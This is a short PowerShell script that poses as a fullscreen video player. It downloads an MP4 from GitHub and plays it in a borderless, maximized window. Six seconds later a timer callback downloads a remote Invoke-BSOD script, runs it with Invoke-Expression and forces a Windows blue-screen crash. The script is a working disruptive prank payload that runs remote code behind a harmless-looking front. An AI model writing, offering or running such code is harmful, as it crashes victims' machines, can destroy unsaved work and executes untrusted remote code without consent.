# Change directory to Music
Set-Location -Path ([Environment]::GetFolderPath("MyMusic"))

# Download the video
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/NiceComputer.mp4" -OutFile "NiceComputer.mp4"

# WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel

# XAML File of WPF as windows for playing movie
[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowStyle="None" WindowState="Maximized">
    <Grid>
        <MediaElement Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"/>
    </Grid>
</Window>
"@

# Movie Path
$VideoSource = Join-Path -Path $PWD.Path -ChildPath "NiceComputer.mp4"

# Devide All Objects on XAML
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")

# Video Default Setting
$VideoPlayer.Volume = 100
$VideoPlayer.Source = $VideoSource
$VideoPlayer.Play()

# Timer for countdown
$Timer = New-Object System.Windows.Threading.DispatcherTimer
$Timer.Interval = [TimeSpan]::FromSeconds(6)
$Timer.Add_Tick({
    $Timer.Stop()
    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
})

# Start the countdown timer after the video starts playing
$VideoPlayer.Add_Loaded({
    $Timer.Start()
})

# Show Up the Window 
$Window.ShowDialog() | Out-Null
